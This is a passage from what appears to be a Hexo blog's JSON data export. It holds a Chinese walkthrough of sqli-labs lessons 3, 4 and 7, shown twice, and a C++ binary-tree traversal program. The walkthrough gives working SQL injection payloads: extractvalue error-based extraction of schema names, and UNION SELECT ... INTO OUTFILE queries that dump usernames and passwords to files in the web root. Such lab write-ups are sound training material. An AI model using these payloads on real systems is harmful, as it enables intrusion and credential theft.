src=\"/images/sqli-labs/Image%20%5B1%5D.png\"></p>\n<p>通过构造闭合即可</p>\n<p>id=1’)%23</p>\n<p>接下来用union联合注入即可</p>\n<p>less4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1”) and 1=1%23</p>\n<p>根据报错注入公式,开始操作</p>\n<p>库名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select database())))%23</span><br></pre></td></tr></table></figure>\n\n<p>表名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))%23</span><br></pre></td></tr></table></figure>\n\n<p>列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))%23</span><br></pre></td></tr></table></figure>\n\n<p>利用right和left函数相互配合爆出字段名s</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23</span><br></pre></td></tr></table></figure>\n\n<p>如法炮制,爆数据即可</p>\n<h5 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less 7\"></a>less 7</h5><p>本题经过尝试得到后台为((‘ ‘))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入<br>1.要使用outfile首先要知道绝对路径</p>\n<p>通过之前的less进行查询</p>\n<p>@@basedir是mysql安装路径</p>\n<p>@@datadir是数据库路径</p>\n<p><img src=\"/images/sqli-labs/1.png\"></p>\n<p>2.读写权限测试mysql快速查看读写权限</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> variables <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqli-labs/2.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;)) and (select count(*) from mysql.user)&gt;0%23</span></span><br></pre></td></tr></table></figure>\n\n<p>如果返回正常,则说明有读写权限</p>\n<p><img src=\"/images/sqli-labs/3.png\"></p>\n<p>其次在linux中还需要mysql用户对目录有w权限才能写入</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"number\">2</span>,table_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>information_schema.tables<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">where</span><span class=\"operator\">%</span><span class=\"number\">20</span>table_schema<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">27</span>security<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">2.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>通过上述语句查询表名,写入到2.txt</p>\n<p><img src=\"/images/sqli-labs/4.png\"></p>\n<p>貌似文件只能新建,不能重复写入<br>查询列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"number\">2</span>,column_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>information_schema.columns<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">where</span><span class=\"operator\">%</span><span class=\"number\">20</span>table_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span>users<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">3.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>查询数据</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,username,password<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>security.users<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">4.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h5 id=\"less3-less4\"><a href=\"#less3-less4\" class=\"headerlink\" title=\"less3 less4\"></a>less3 less4</h5><p>less3   less4</p>\n<p>less4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入</p>\n<p>通过单引号报错信息</p>\n<p>推测可能在接收参数后添加了( )包裹了id参数</p>\n<p><img src=\"/images/sqli-labs/Image.png\"></p>\n<p><img src=\"/images/sqli-labs/Image%20%5B1%5D.png\"></p>\n<p>通过构造闭合即可</p>\n<p>id=1’)%23</p>\n<p>接下来用union联合注入即可</p>\n<p>less4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1”) and 1=1%23</p>\n<p>根据报错注入公式,开始操作</p>\n<p>库名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select database())))%23</span><br></pre></td></tr></table></figure>\n\n<p>表名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))%23</span><br></pre></td></tr></table></figure>\n\n<p>列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))%23</span><br></pre></td></tr></table></figure>\n\n<p>利用right和left函数相互配合爆出字段名s</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span>&quot;)and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23</span><br></pre></td></tr></table></figure>\n\n<p>如法炮制,爆数据即可</p>\n<h5 id=\"less-7\"><a href=\"#less-7\" class=\"headerlink\" title=\"less 7\"></a>less 7</h5><p>本题经过尝试得到后台为((‘ ‘))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入<br>1.要使用outfile首先要知道绝对路径</p>\n<p>通过之前的less进行查询</p>\n<p>@@basedir是mysql安装路径</p>\n<p>@@datadir是数据库路径</p>\n<p><img src=\"/images/sqli-labs/1.png\"></p>\n<p>2.读写权限测试mysql快速查看读写权限</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">show</span> variables <span class=\"keyword\">like</span> <span class=\"string\">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/sqli-labs/2.png\"></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27;)) and (select count(*) from mysql.user)&gt;0%23</span></span><br></pre></td></tr></table></figure>\n\n<p>如果返回正常,则说明有读写权限</p>\n<p><img src=\"/images/sqli-labs/3.png\"></p>\n<p>其次在linux中还需要mysql用户对目录有w权限才能写入</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"number\">2</span>,table_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>information_schema.tables<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">where</span><span class=\"operator\">%</span><span class=\"number\">20</span>table_schema<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">27</span>security<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">2.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>通过上述语句查询表名,写入到2.txt</p>\n<p><img src=\"/images/sqli-labs/4.png\"></p>\n<p>貌似文件只能新建,不能重复写入<br>查询列名</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,<span class=\"number\">2</span>,column_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>information_schema.columns<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">where</span><span class=\"operator\">%</span><span class=\"number\">20</span>table_name<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">=</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span>users<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">3.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>查询数据</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"operator\">%</span><span class=\"number\">27</span>))<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">union</span><span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">select</span><span class=\"operator\">%</span><span class=\"number\">201</span>,username,password<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">from</span><span class=\"operator\">%</span><span class=\"number\">20</span>security.users<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"keyword\">into</span><span class=\"operator\">%</span><span class=\"number\">20</span>outfile<span class=\"operator\">%</span><span class=\"number\">20</span><span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">/</span>www<span class=\"operator\">/</span>wwwroot<span class=\"operator\">/</span>sqli<span class=\"operator\">-</span>labs<span class=\"operator\">/</span>Less<span class=\"number\">-7</span><span class=\"operator\">/</span><span class=\"number\">4.</span>txt<span class=\"operator\">%</span><span class=\"number\">27</span><span class=\"operator\">%</span><span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"二叉树遍历","date":"2021-12-04T15:11:02.000Z","typora-root-url":"..","_content":"\n```cpp\n#include<iostream>\n#include<stdlib.h>\nusing namespace std;\n#define STACK_INIT_SIZE 100//存储空间初始分配量\n#define STACKINCREMENT 10//存储空间分配增量\n\ntypedef struct BiTNode {\n\tchar data;\n\tstruct BiTNode* lchild, * rchild;\n}BiTNode,* BiTree;\ntypedef struct Node\n{\n\tBiTNode* treeNode;\n\tNode* next;\n}Node;\ntypedef struct LinkQueue {\n\tNode* front;\n\tNode* rear;\n\n}LinkQueue;\ntypedef struct {\n\tBiTNode* top;\n\tBiTNode* base;\n\tint size;\n\n}stack;\nvoid createBiTree(BiTree& t);\nvoid preOrderTraverse(BiTree t);\nvoid inOrderTraverse1(BiTree t);\nvoid postOrderTraverse(BiTree t);\nint getDeep(BiTree t);\nbool initQueue(LinkQueue& Q);\nbool enQueue(LinkQueue& Q, BiTNode treeNode);\nvoid deQueue(LinkQueue& Q);\nvoid floorTraverse(LinkQueue& Q, BiTree& t);\nvoid inOrderTraverse2(stack s, BiTree& t);\nvoid initStack(stack& s);\nbool isEmpty(stack& s);\nvoid push(stack& s, BiTNode treeNode);\nBiTNode pop(stack& s);\n\nint main() {\n\tBiTree t;\n\tstack s;\n\tinitStack(s);\n\tLinkQueue Q;\n\tinitQueue(Q);\n\tcreateBiTree(t);\n\tcout << \"二叉树创建完成\" << endl<<endl;\n\tcout << \"先序遍历\" << endl;\n\tpreOrderTraverse(t);\n\tcout << endl;\n\tcout << \"递归中序遍历\" <<endl;\n\tinOrderTraverse1(t);\n\tcout << endl;\n\tcout << \"非递归中序遍历\" << endl;\n\tinOrderTraverse2(s, t);\n\tcout << endl;\n\tcout << \"后序遍历\" << endl;\n\tpostOrderTraverse(t);\n\tcout << endl;\n\tcout << \"层序遍历\" << endl;\n\tfloorTraverse(Q, t);\n\tcout << endl;\n\t\n\tcout << \"二叉树的深度为\" << getDeep(t) << endl;\n\treturn 0;\n}\nvoid createBiTree(BiTree& t) {\n\tchar c;\n\tcin >> c;\n\tif (c == '$')\n\t\t//利用给先序遍历序列添加空节点保证建立二叉树的唯一性\n\t\tt = NULL;\n\telse {\n\t\tif (!(t = (BiTNode*)malloc(sizeof(BiTNode)))) {\n\t\t\texit(OVERFLOW);\n\t\t}\n\t\t//申请该节点的内存空间\n\t\t//按照先序序列创建二叉树\n\t\tt->data = c;\n\t\tcreateBiTree(t->lchild);\n\t\tcreateBiTree(t->rchild);\n\n\t}\n\treturn;\n}\n//先序遍历\nvoid preOrderTraverse(BiTree t) {\n\tif (t) {\n\t\tcout << t->data << \" \" << flush;\n\t\tpreOrderTraverse(t->lchild);\n\t\tpreOrderTraverse(t->rchild);\n\t}\n}\n//中序遍历\nvoid inOrderTraverse1(BiTree t) {\n\tif (t) {\n\t\tinOrderTraverse1(t->lchild);\n\t\tcout << t->data << \" \" << flush;\n\t\tinOrderTraverse1(t->rchild);\n\t}\n}\n//后序遍历\nvoid postOrderTraverse(BiTree t) {\n\tif (t) {\n\t\tpostOrderTraverse(t->lchild);\n\t\tpostOrderTraverse(t->rchild);\n\t\tcout << t->data << \" \" << flush;\n\t}\n}\nint getDeep(BiTree t) {\n\tif (t == NULL) {\n\t\treturn 0;\n\t}\n\t//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1\n\tint a = getDeep(t->lchild);\n\tint b = getDeep(t->rchild);\n\treturn (a > b) ? (a + 1) : (b + 1);\n}\nbool initQueue(LinkQueue& Q) {\n\tQ.front = Q.rear = new Node;\n\t//这个链队列是具有头结点的链队列,头结点不存数据\n\tif (!Q.front) {\n\t\texit(OVERFLOW);\n\t}\n\tQ.front->next = NULL;\n\treturn true;\n}\nbool enQueue(LinkQueue& Q, BiTNode *treeNode) {\n\tNode* p = (Node*)malloc(sizeof(Node));\n\t//如果内存申请失败\n\tif (!p) {\n\t\texit(OVERFLOW);\n\t}\n\t//让p节点中的treeNode指向对应的树节点\n\tp->treeNode =treeNode;\n\tp->next = NULL;\n\n\t//连接链表\n\tQ.rear->next = p;\n\n\t//头结点的data域为空,尾结点data域非空\n\tQ.rear = p;\n\treturn true;\n\n}\nvoid deQueue(LinkQueue& Q) {\n\tif (Q.front && Q.front != Q.rear) {\n\t\t//新建一个temp指针p\n\t\tNode* p = Q.front->next;\n\n\t\tQ.front->next = p->next;\n\t\t//判断出队的是不是最后一个节点\n\t\t//如果不加这个判断free(p后),Q.rear->next会变为野指针\n\t\tif (p == Q.rear) {\n\t\t\tQ.rear = Q.front;\n\t\t}\n\t\tfree(p);\n\t\n\t}\n\treturn;\n}\nvoid floorTraverse(LinkQueue& Q, BiTree& t) {\n\n\tif (t != NULL) {\n\t\tenQueue(Q, t);\n\t}\n\twhile (Q.front != Q.rear) {\n\t\tcout << Q.front->next->treeNode->data <<' ' << flush;\n\t\tif (Q.front->next->treeNode->lchild != NULL) {\n\t\t\tenQueue(Q, Q.front->next->treeNode->lchild);\n\t\t}\n\t\tif (Q.front->next->treeNode->rchild != NULL) {\n\t\t\tenQueue(Q, Q.front->next->treeNode->rchild);\n\t\t}\n\t\tdeQueue(Q);\n\t}\n}\n\nvoid inOrderTraverse2(stack s,BiTree& t) {\n\n\tBiTNode* p = t;\n\twhile(p || !isEmpty(s)) {\n\t\tif (p) {\n\t\t\tpush(s, *p);\n\t\t\tp = p->lchild;\n\t\t}\n\t\telse {\n\t\t\tBiTNode e = pop(s);\n\t\t\tcout << e.data << \" \" << flush;\n\t\t\tp = e.rchild;\n\t\t}\n\t}\n\treturn;\n}\n//栈相关函数\nvoid initStack(stack& s) {\n\t//申请内存空间\n\ts.base = (BiTNode*)malloc(STACK_INIT_SIZE * sizeof(BiTNode));\n\tif (!s.base) {\n\t\texit(OVERFLOW);\n\t}\n\ts.top = s.base;\n\ts.size = STACK_INIT_SIZE;\n\treturn;\n}\nbool isEmpty(stack& s) {\n\tif (s.base == s.top)\n\t\treturn true;\n\telse\n\t\treturn false;\n}\nvoid push(stack& s, BiTNode treeNode) {\n\tif (s.top - s.base >= s.size) {\n\t\ts.base = (BiTNode*)realloc(s.base, (s.size + STACKINCREMENT) * sizeof(BiTNode));\n\t\tif (!s.base) {\n\t\t\texit(OVERFLOW);\n\t\t}\n\t\ts.top = s.base + s.size;\n\t\ts.size += STACKINCREMENT;\n\t}\n\t*s.top++ = treeNode;\n}\nBiTNode pop(stack& s) {\n\tif (s.base) {\t\n\t\tBiTNode e = (*--s.top);\n\t\t(*s.top).data = '$';\n\t\treturn e;\n\t}\n}\n```\n\n","source":"_posts/二叉树遍历.md","raw":"---\ntitle: 二叉树遍历\ndate: 2021-12-04 23:11:02\ntags: \n    -cpp\n    -数据结构\n    -二叉树\ncategories: 数据结构\ntypora-root-url: ..\n---\n\n```cpp\n#include<iostream>\n#include<stdlib.h>\nusing namespace std;\n#define STACK_INIT_SIZE 100//存储空间初始分配量\n#define STACKINCREMENT 10//存储空间分配增量\n\ntypedef struct BiTNode {\n\tchar data;\n\tstruct BiTNode* lchild, * rchild;\n}BiTNode,* BiTree;\ntypedef struct Node\n{\n\tBiTNode* treeNode;\n\tNode* next;\n}Node;\ntypedef struct LinkQueue {\n\tNode* front;\n\tNode* rear;\n\n}LinkQueue;\ntypedef struct {\n\tBiTNode* top;\n\tBiTNode* base;\n\tint size;\n\n}stack;\nvoid createBiTree(BiTree& t);\nvoid preOrderTraverse(BiTree t);\nvoid inOrderTraverse1(BiTree t);\nvoid postOrderTraverse(BiTree t);\nint getDeep(BiTree t);\nbool initQueue(LinkQueue& Q);\nbool enQueue(LinkQueue& Q, BiTNode treeNode);\nvoid deQueue(LinkQueue& Q);\nvoid floorTraverse(LinkQueue& Q, BiTree& t);\nvoid inOrderTraverse2(stack s, BiTree& t);\nvoid initStack(stack& s);\nbool isEmpty(stack& s);\nvoid push(stack& s, BiTNode treeNode);\nBiTNode pop(stack& s);\n\nint main() {\n\tBiTree t;\n\tstack s;\n\tinitStack(s);\n\tLinkQueue Q;\n\tinitQueue(Q);\n\tcreateBiTree(t);\n\tcout << \"二叉树创建完成\" << endl<<endl;\n\tcout << \"先序遍历\" << endl;\n\tpreOrderTraverse(t);\n\tcout << endl;\n\tcout << \"递归中序遍历\" <<endl;\n\tinOrderTraverse1(t);\n\tcout << endl;\n\tcout << \"非递归中序遍历\" << endl;\n\tinOrderTraverse2(s, t);\n\tcout << endl;\n\tcout << \"后序遍历\" << endl;\n\tpostOrderTraverse(t);\n\tcout << endl;\n\tcout << \"层序遍历\" << endl;\n\tfloorTraverse(Q, t);\n\tcout << endl;\n\t\n\tcout << \"二叉树的深度为\" << getDeep(t) << endl;\n\treturn 0;\n}\nvoid createBiTree(BiTree& t) {\n\tchar c;\n\tcin >> c;\n\tif (c == '$')\n\t\t//利用给先序遍历序列添加空节点保证建立二叉树的唯一性\n\t\tt = NULL;\n\telse {\n\t\tif (!(t = (BiTNode*)malloc(sizeof(BiTNode)))) {\n\t\t\texit(OVERFLOW);\n\t\t}\n\t\t//申请该节点的内存空间\n\t\t//按照先序序列创建二叉树\n\t\tt->data = c;\n\t\tcreateBiTree(t->lchild);\n\t\tcreateBiTree(t->rchild);\n\n\t}\n\treturn;\n}\n//先序遍历\nvoid preOrderTraverse(BiTree t) {\n\tif (t) {\n\t\tcout << t->data << \" \" << flush;\n\t\tpreOrderTraverse(t->lchild);\n\t\tpreOrderTraverse(t->rchild);\n\t}\n}\n//中序遍历\nvoid inOrderTraverse1(BiTree t) {\n\tif (t) {\n\t\tinOrderTraverse1(t->lchild);\n\t\tcout << t->data << \" \" << flush;\n\t\tinOrderTraverse1(t->rchild);\n\t}\n}\n//后序遍历\nvoid postOrderTraverse(BiTree t) {\n\tif (t) {\n\t\tpostOrderTraverse(t->lchild);\n\t\tpostOrderTraverse(t->rchild);\n\t\tcout << t->data << \" \" << flush;\n\t}\n}\nint getDeep(BiTree t) {\n\tif (t == NULL) {\n\t\treturn 0;\n\t}\n\t//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1\n\tint a = getDeep(t->lchild);\n\tint b = getDeep(t->rchild);\n\treturn (a > b) ? (a + 1) : (b + 1);\n}\nbool initQueue(LinkQueue& Q) {\n\tQ.front = Q.rear = new Node;\n\t//这个链队列是具有头结点的链队列,头结点不存数据\n\tif (!Q.front) {\n\t\texit(OVERFLOW);\n\t}\n\tQ.front->next = NULL;\n\treturn true;\n}\nbool enQueue(LinkQueue& Q, BiTNode *treeNode) {\n\tNode* p = (Node*)malloc(sizeof(Node));\n\t//如果内存申请失败\n\tif (!p) {\n\t\texit(OVERFLOW);\n\t}\n\t//让p节点中的treeNode指向对应的树节点\n\tp->treeNode =treeNode;\n\tp->next = NULL;\n\n\t//连接链表\n\tQ.rear->next = p;\n\n\t//头结点的data域为空,尾结点data域非空\n\tQ.rear = p;\n\treturn true;\n\n}\nvoid deQueue(LinkQueue& Q) {\n\tif (Q.front && Q.front != Q.rear) {\n\t\t//新建一个temp指针p\n\t\tNode* p = Q.front->next;\n\n\t\tQ.front->next = p->next;\n\t\t//判断出队的是不是最后一个节点\n\t\t//如果不加这个判断free(p后),Q.rear->next会变为野指针\n\t\tif (p == Q.rear) {\n\t\t\tQ.rear = Q.front;\n\t\t}\n\t\tfree(p);\n\t\n\t}\n\treturn;\n}\nvoid floorTraverse(LinkQueue& Q, BiTree& t) {\n\n\tif (t != NULL) {\n\t\tenQueue(Q, t);\n\t}\n\twhile (Q.front != Q.rear) {\n\t\tcout << Q.front->next->treeNode->data <<' ' << flush;\n\t\tif (Q.front->next->treeNode->lchild != NULL) {\n\t\t\tenQueue(Q, Q.front->next->treeNode->lchild);\n\t\t}\n\t\tif (Q.front->next->treeNode->rchild != NULL) {\n\t\t\tenQueue(Q, Q.front->next->treeNode->rchild);\n\t\t}\n\t\tdeQueue(Q);\n\t}\n}\n\nvoid inOrderTraverse2(stack s,BiTree& t) {\n\n\tBiTNode* p = t;\n\twhile(p || !isEmpty(s)) {\n\t\tif (p) {\n\t\t\tpush(s, *p);\n\t\t\tp = p->lchild;\n\t\t}\n\t\telse {\n\t\t\tBiTNode e = pop(s);\n\t\t\tcout << e.data << \" \" << flush;\n\t\t\tp = e.rchild;\n\t\t}\n\t}\n\treturn;\n}\n//栈相关函数\nvoid initStack(stack& s) {\n\t//申请内存空间\n\ts.base = (BiTNode*)malloc(STACK_INIT_SIZE * sizeof(BiTNode));\n\tif (!s.base) {\n\t\texit(OVERFLOW);\n\t}\n\ts.top = s.base;\n\ts.size = STACK_INIT_SIZE;\n\treturn;\n}\nbool isEmpty(stack& s) {\n\tif (s.base == s.top)\n\t\treturn true;\n\telse\n\t\treturn false;\n}\nvoid push(stack& s, BiTNode treeNode) {\n\tif (s.top - s.base >= s.size) {\n\t\ts.base = (BiTNode*)realloc(s.base, (s.size + STACKINCREMENT) * sizeof(BiTNode));\n\t\tif (!s.base) {\n\t\t\texit(OVERFLOW);\n\t\t}\n\t\ts.top = s.base + s.size;\n\t\ts.size += STACKINCREMENT;\n\t}\n\t*s.top++ = treeNode;\n}\nBiTNode pop(stack& s) {\n\tif (s.base) {\t\n\t\tBiTNode e = (*--s.top);\n\t\t(*s.top).data = '$';\n\t\treturn e;\n\t}\n}\n```\n\n","slug":"二叉树遍历","published":1,"updated":"2021-12-04T15:13:07.480Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckwrz8yim000dwouy8cv7bclk","content":"<figure class=\"highlight cpp\"><table><tr><td 